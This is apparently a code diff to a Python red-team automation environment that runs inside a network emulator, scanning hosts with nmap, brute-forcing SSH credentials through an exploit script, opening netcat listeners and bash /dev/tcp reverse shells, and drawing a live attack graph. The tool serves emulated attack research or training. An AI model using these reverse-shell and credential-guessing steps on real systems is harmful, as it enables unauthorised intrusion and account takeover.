@@ -1,12 +1,16 @@
-
-import base64
 import ipaddress
-from time import sleep
 import networkx as nx
 from aco_emulator import ACOEmulator
 import re
 import matplotlib.pyplot as plt
 import shlex
+import queue
+# from pprint import pprint
+# from time import sleep
+# import base64
+# import docker
+# import threading
+# import time
 
 class RedTeamEnv:
     def __init__(self, topo: ACOEmulator):
@@ -32,12 +36,82 @@ class RedTeamEnv:
 
         # Reachability graph with node metadata
         self.graph = nx.DiGraph()
-        self.graph.add_node('user0', ip=[ipaddress.IPv4Address('10.0.0.1')], access='root', open_ports=[22])
+        self.graph.add_node('user0', ip=self.observations['user0']['IP Address'], access='root', open_ports=[22])
 
         # Map: hostname -> ipaddress.IPv4Address
         self.host_ip_map = {
                     h.name: [ipaddress.IPv4Address(h.IP(intf=intf)) for intf in h.intfList()] for h in self.net.hosts
                 }
+        
+        # graph related variables
+        self._update_queue = queue.Queue()
+        self._status_text = ""
+        
+    def start_plot_loop(self):
+        plt.ion()
+        fig, ax = plt.subplots(figsize=(12, 8))
+        
+        def get_service_info_str(open_ports):
+            return "\n".join([f"{s['port']}/{s['protocol']} ({s['service']})" for s in open_ports]) if open_ports else ""
+
+        def draw():
+            ax.clear()
+            try:
+                pos = nx.nx_agraph.graphviz_layout(self.graph, prog='dot')
+            except:
+                pos = nx.spring_layout(self.graph, seed=42)
+
+            node_colors = []
+            for _, attr in self.graph.nodes(data=True):
+                if attr.get('impact') == True:
+                    node_colors.append('red')
+                elif attr.get('access') == 'root':
+                    node_colors.append('orange')
+                elif attr.get('access') == 'user':
+                    node_colors.append('yellow')
+                else:
+                    node_colors.append('lightgray')
+
+            edge_colors = []
+            for _, _, attr in self.graph.edges(data=True):
+                if attr.get('type') == 'reverse_shell':
+                    edge_colors.append('black')
+                elif attr.get('type') == 'discovery':
+                    edge_colors.append('gray')
+                else:
+                    edge_colors.append('black')
+
+            labels = {
+                node: f"{node}\n{data['ip']}\n({data['access']})\n{get_service_info_str(data.get('Open Ports', []))}"
+                for node, data in self.graph.nodes(data=True)
+            }
+
+            nx.draw(self.graph, pos, ax=ax, with_labels=True, labels=labels,
+                    node_color=node_colors, node_size=2500, font_size=8,
+                    edge_color=edge_colors, width=2)
+            
+            # Display status text
+            ax.text(0.01, 0.99, self._status_text,
+              verticalalignment='top', horizontalalignment='left',
+              transform=ax.transAxes,
+              fontsize=12, color='blue', bbox=dict(facecolor='white', alpha=0.7))
+
+            
+            fig.canvas.draw()
+            fig.canvas.flush_events()
+
+        # Main loop that runs in the main thread
+        while True:
+            try:
+                task = self._update_queue.get(timeout=0.1)
+                if task == 'update':
+                    draw()
+            except queue.Empty:
+                continue
+
+    def update_graph(self, text=""):
+        self._update_queue.put('update')
+        self._status_text = text
 
     def get_observation(self):
         """Return a dict with current view of reachable nodes."""
@@ -105,13 +179,14 @@ class RedTeamEnv:
     def discover_network(self, target_ip: str):
         """Run service discovery (Nmap) on the target IP from a reachable root-access node."""
         script_path = "/home/hacker/red_scripts/discover_network.sh"
+        script = f"nmap {target_ip}"
         
         source_node = None
         for node in self.root_access_nodes:
             if self._is_reachable(node, target_ip):
                 source_node = node
                 break
-
+        
         if not source_node:
             print(f"[!] No root-access node can reach {target_ip}")
             return
@@ -119,7 +194,7 @@ class RedTeamEnv:
         print(f"[*] {source_node} executing service discovery on {target_ip}")
         output = self.execute_command_on(source_node, f"bash {script_path} {target_ip}").strip()
         
-        print(f"[>] Nmap output:\n{output}")
+        # print(f"[>] Nmap output:\n{output}")
         print("-" * 80)
         # Parse Nmap output for open ports
         services = []
@@ -156,16 +231,18 @@ class RedTeamEnv:
                 print(f"[+] Added services for {host}: {[s['port'] for s in services]}")
         else:
             print(f"[!] Host {target_ip} has no open ports.")
-        
-            
+                  
     def plot_graph(self):
-        """Plot the current reachability graph with node labels and colors."""
-        pos = nx.spring_layout(self.graph, seed=42)
+        """Plot the current reachability graph with node labels and colors, using a tree layout."""
+        try:
+            pos = nx.nx_agraph.graphviz_layout(self.graph, prog='dot')  # nice tree layout
+        except:
+            # Fallback if graphviz is not installed
+            pos = nx.spring_layout(self.graph, seed=42)
 
-        # Node colors: green = root, gray = unknown
+        # Node colors
         node_colors = []
         for _, attr in self.graph.nodes(data=True):
-            
             if attr.get('impact') == True:
                 node_colors.append('red')
             elif attr.get('access') == 'root':
@@ -174,8 +251,8 @@ class RedTeamEnv:
                 node_colors.append('yellow')
             else:
                 node_colors.append('lightgray')
-                
-        # Edge colors: red = reverse shell, gray = discovery
+
+        # Edge colors
         edge_colors = []
         for _, _, attr in self.graph.edges(data=True):
             if attr.get('type') == 'reverse_shell':
@@ -185,19 +262,19 @@ class RedTeamEnv:
             else:
                 edge_colors.append('black')
 
-        # Node labels: include IP, access level and service info
+        # Node labels
         def get_service_info_str(open_ports):
             if open_ports:
                 return "\n".join([f"{service['port']}/{service['protocol']} ({service['service']})" for service in open_ports])
             else:
                 return ""
-        
+
         labels = {
             node: f"{node}\n{data['ip']}\n({data['access']})\n{get_service_info_str(data.get('Open Ports', []))}"
             for node, data in self.graph.nodes(data=True)
         }
 
-        plt.figure(figsize=(10, 6))
+        plt.figure(figsize=(12, 8))
         nx.draw(self.graph, pos, with_labels=True, labels=labels, 
                 node_color=node_colors, node_size=2500, font_size=8, edge_color=edge_colors, width=2)
         plt.title("Red Team Reachability Graph")
@@ -216,22 +293,91 @@ class RedTeamEnv:
         in the current reachability graph.
         """
         target_host = self._resolve_ip_to_host(ipaddress.IPv4Address(target_ip))
+        print(target_host)
         
         if self.graph.has_edge(node, target_host):
             return True
         return False
 
-    def execute_command_on(self, target_node, command):
+    def execute_command_on(self, target_node, command, non_blocking=False):
         """Send a command from user0 to a reachable target node via reverse shell chain."""
-        relay_cmd = self._relay_command("user0", target_node, command)
-        if relay_cmd:
-            print(f"[>] Sending relayed command to {target_node}:\n{relay_cmd}")
-            result = self.net.get("user0").cmd(relay_cmd).strip()
-            sleep(2)
-            print(f"[<] Command result: {result}")
-            return result
+        host = self.net.get(target_node)
+        print(command)
+        
+        proc = host.popen(["bash", "-c", command])
+        output = ''
+        if not non_blocking:
+            stdout, _ = proc.communicate()
+            output = stdout.decode('utf-8')  
+            print(f"[<] Command result: {output}")
+
+        return output
+            
+    # def execute_command_on(self, target_node, command, non_blocking=False):
+    #     """Send a command from user0 to a reachable target node via reverse shell chain."""
+    #     relay_cmd = self._relay_command("user0", target_node, command)
+    #     # relay_cmd2 = self._relay_command("user0", target_node, "echo 'Flush'")
+    #     if relay_cmd:
+    #         print(f"[>] Sending relayed command to {target_node}:\n{relay_cmd}")
+    #         sleep_time = 3
+    #         # result = self.net.get("user0").cmd(relay_cmd2)
+    #         # sleep(sleep_time)
+    #         host = self.net.get("user0")
+
+    #         # command = f"bash -c {shlex.quote(relay_cmd)}"
+    #         proc = host.popen(["bash", "-c", relay_cmd])
+    #         output = ''
+    #         if not non_blocking:
+    #             stdout, _ = proc.communicate()
+    #             output = stdout.decode('utf-8')  
+    #             print(f"[<] Command result: {output}")
+
+    #         output = output.strip()
+    #         print("sleeping")
+    #         sleep(sleep_time)
+    #         print(f"[<] Command result: {output}")
+    #         return output
+    #     else:
+    #         print("[!] Command not sent — path unreachable.")
+    
+    def exploit(self, target_host):
+        """Run exploit.sh from a node in the given subnet with root access."""
+        script_path = "/home/hacker/red_scripts/exploit.sh"
+        users_list = "/home/hacker/red_scripts/users.txt"
+        password_list = "/home/hacker/red_scripts/passwords.txt"
+        target_ip = self.host_ip_map.get(target_host)[0]
+        
+        source_node = None
+        for node in self.root_access_nodes:
+            if self._is_reachable(node, str(target_ip)):
+                source_node = node
+                break
+            
+        if not source_node:
+            print(f"[!] No root-access node can reach {target_host}")
+            return
+        
+        source_ip = self.host_ip_map.get(source_node)[0]
+
+        print(f"[*] Executing exploit on target {target_host}")
+
+        output = self.execute_command_on(source_node, f"bash {script_path} {target_ip} {users_list} {password_list} {str(source_ip)} 4444").strip()
+        print("Exploit Output: ", output)
+        # parse output for valid ssh credentials
+        username, password = None, None
+        for line in output.splitlines():
+            pattern = r"\[\+\] Found valid credentials:\s+(\w+):(\w+)"
+            match = re.search(pattern, line)
+            if match:
+                username = match.group(1)
+                password = match.group(2)
+                break
+        if username and password:
+            print(f"[+] Found credentials for {target_host}: {username}:{password}")
+            self.drop_reverse_shell(source_node, target_host, username, password)
         else:
-            print("[!] Command not sent — path unreachable.")
+            print(f"[!] No valid credentials found for {target_host}")
+            return
 
     def _relay_command(self, source, target, final_command):
         """Construct a command relayed through the reverse shell chain."""
@@ -257,14 +403,24 @@ class RedTeamEnv:
             if not port:
                 raise ValueError(f"[!] No port found for edge {attacker} → {victim}")
             
-            # encoded = base64.b64encode(cmd.encode()).decode()
             
-            sleep_time = 22 if 'network' in cmd else 5
+            sleep_time = 22 if 'network' in cmd else 4
             cmd = shlex.quote(cmd)
             empty_cmd = shlex.quote("")
             
-            cmd = f"echo {empty_cmd} > /home/hacker/output_{port}.txt ; echo {cmd} > /home/hacker/fifo_{port}; sleep {sleep_time}; cat /home/hacker/output_{port}.txt | strings "
-            # cmd = f"echo \"\" > /home/hacker/output_{port}.txt ; echo \"{encoded}\" | base64 -d > /home/hacker/fifo_{port}; sleep {sleep_time}; cat /home/hacker/output_{port}.txt | strings "
+            
+            
+            cmd1 = f"echo {empty_cmd} > /home/hacker/output_{port}.txt"
+            
+            cmd2 = f"echo {cmd} > /home/hacker/fifo_{port}"
+            
+            cmd3 = f"sleep {sleep_time}"
+            
+            cmd4 = f"cat /home/hacker/output_{port}.txt | strings"
+            
+            cmd = f"{cmd1} ; {cmd2} ; {cmd3} ; {cmd4}"
+            
+            # cmd = f"bash -{shlex.quote(cmd1)} ; bash -c {shlex.quote(cmd2)} ; bash -c {shlex.quote(cmd3)} ; bash -c {shlex.quote(cmd4)} "
         return cmd
         
     def drop_reverse_shell(self, from_host: str, to_host: str, username: str, password: str):
@@ -274,6 +430,18 @@ class RedTeamEnv:
         """
         attacker_ip = self.host_ip_map[from_host]
         target_ip = self.host_ip_map[to_host]
+        
+        if self.observations[from_host]['Access'] != 'root':
+            print(f"[!] Cannot Drop reverse shell from {from_host} to {to_host}.")
+            return
+        
+        if self.observations[to_host]['Access'] != 'unknown':
+            print(f"[!] Cannot Drop reverse shell from {from_host} to {to_host}.")
+            return
+        
+        if self.observations[to_host]['Open Ports'] == []:
+            print(f"[!] Cannot Drop reverse shell from {from_host} to {to_host}.")
+            return
         
         if not attacker_ip or not target_ip:
             print(f"[!] Cannot Drop reverse shell between {from_host} and {to_host}.")
@@ -293,31 +461,40 @@ class RedTeamEnv:
         fifo_file = f"/home/hacker/fifo_{revshell_port}"
 
         # Step 1: Setup persistent command relay on `to_host`
-        setup_cmds = [
-            f"rm -f {in_file} {out_file} {fifo_file}",
-            f"mkfifo {fifo_file}",
-            f"touch {in_file} {out_file}",
+        # setup_cmds = [
+        #     f"rm -f {in_file} {out_file} {fifo_file}",
+        #     f"mkfifo {fifo_file}",
+        #     f"touch {in_file} {out_file}",
 
-            # This process sets up reverse shell listener piping output into fifo
-            f"bash -c {shlex.quote(f"tail -f {fifo_file} | nc -lnvp {revshell_port} | tee {out_file} &")}",
-            f"sleep 2; "
-        ]
+        #     # This process sets up reverse shell listener piping output into fifo
+        #     f"cat {fifo_file} | nc -lnvp {revshell_port} | tee {out_file} &",
+        #     # f"tail -f {fifo_file} | nc -lnvp {revshell_port} | tee {out_file} &",
+        # ]
+
+        setup_cmds = [f"nc -lnvp {revshell_port}"]
 
         full_setup_cmd = " && ".join(setup_cmds)
         print(f"[*] Setting up persistent FIFO reverse shell listener on {to_host}")
-        result = self.execute_command_on(from_host, full_setup_cmd).strip()
+        result = self.execute_command_on(from_host, full_setup_cmd, non_blocking=True).strip()
         print(f"[<] Setup command result: {result}")
 
         # Step 2: Connect from `to_host` back to listener on `from_host`
-        revshell_cmd = (
-            f"sshpass -p '{password}' ssh -o StrictHostKeyChecking=no "
-            f"-o ConnectTimeout=5 {username}@{target_ip} "
-            f"\"bash -i >& /dev/tcp/{attacker_ip}/{revshell_port} 0>&1\" &"
-        )
+        # revshell_cmd = (
+        #     f"sshpass -p '{password}' ssh -o StrictHostKeyChecking=no "
+        #     f"-o ConnectTimeout=5 {username}@{target_ip} "
+        #     f"\"bash -i >& /dev/tcp/{attacker_ip}/{revshell_port} 0>&1\""
+        # )
+        
+        revshell_cmd = f"bash -i >& /dev/tcp/{attacker_ip}/{revshell_port} 0>&1"
+        
+        # print(self.execute_command_on(from_host, "ps -aux | grep -E 'nc|tail|cat'").strip())
         
         print(f"[*] Dropping reverse shell from {to_host} to {from_host}:{revshell_port}")
-        result = self.execute_command_on(from_host, command=revshell_cmd).strip()
-        # result = self.execute_command_on(from_host, command="sleep 4").strip()
+        result = self.execute_command_on(to_host, command=revshell_cmd, non_blocking=True).strip()
+        # result = self.execute_command_on(from_host, command=revshell_cmd, non_blocking=True).strip()
+
+        print(self.execute_command_on(to_host, "netstat -an"))
+        print(self.execute_command_on(from_host, "netstat -an"))
 
         # Step 3: Register reverse shell path
         shell_type = "root" if username == "root" else "user"
@@ -362,7 +539,7 @@ class RedTeamEnv:
 
 
         cleanup_cmd = f"""
-        pids=$(ps aux | grep -E '{in_file}|{fifo_file}|nc|tail' | grep -v grep | awk '{{print $2}}') ;
+        pids=$(ps aux | grep -E '{in_file}|{fifo_file}|nc|tail|tee' | grep -v grep | awk '{{print $2}}') ;
         for pid in $pids; do kill -9 $pid ; done ;
         rm -f {in_file} {out_file} {fifo_file} ;
         """
@@ -400,6 +577,10 @@ class RedTeamEnv:
         if not target_ip or len(target_ip) != 1:
             raise ValueError(f"[!] Cannot privilege escalate for {target}")
         
+        if self.observations[target]['Access'] != 'user':
+            print(f"[!] Cannot privilege escalate for {target}")
+            return
+
         for node in self.root_access_nodes:
             if self._is_reachable(node, target_ip[0]):
                 source_node = node
